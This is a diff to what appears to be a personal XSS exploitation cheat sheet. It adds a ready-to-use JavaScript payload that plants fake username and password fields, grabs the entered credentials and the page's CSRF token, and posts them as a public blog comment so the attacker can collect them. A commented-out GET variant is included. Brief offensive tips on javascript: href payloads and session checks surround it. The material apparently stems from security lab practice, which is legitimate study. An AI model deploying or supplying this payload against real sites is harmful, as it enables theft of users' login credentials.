@@ -4,7 +4,38 @@ exploitation
 - if the payload is inserted in a href    you can use `javascript:payload`
 - if you found xss try to find failure to invalidate session on logout
 - 
+##### input field auto submit the username and the password in the comment 
+```java script
+<input type="text" name="username">
+<input type="password" name="password" onchange="hax()">
 
+<script>
+function hax() {
+    var token = document.getElementsByName('csrf')[0].value;
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+
+    var data = new FormData();
+    data.append('csrf', token);
+    data.append('postId', 8);
+    data.append('comment', `${username}:${password}`);
+    data.append('name', 'victim');
+    data.append('email', 'zenshell@zenshell.ninja');
+    data.append('website', 'http://www.zenshell.ninja');
+
+    fetch('/post/comment', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: data
+    });
+/*if the page is taking the data in a get request 
+	fetch(`/post/comment?${params.toString()}`,
+	 { method: 'GET', mode: 'no-cors' });
+*/
+}
+</script>
+
+```
 ##### encoding and escaping 
 ###### scenario 1 
 in this scenario the single quote is escaped every `'` has `\` that is escaping it and 
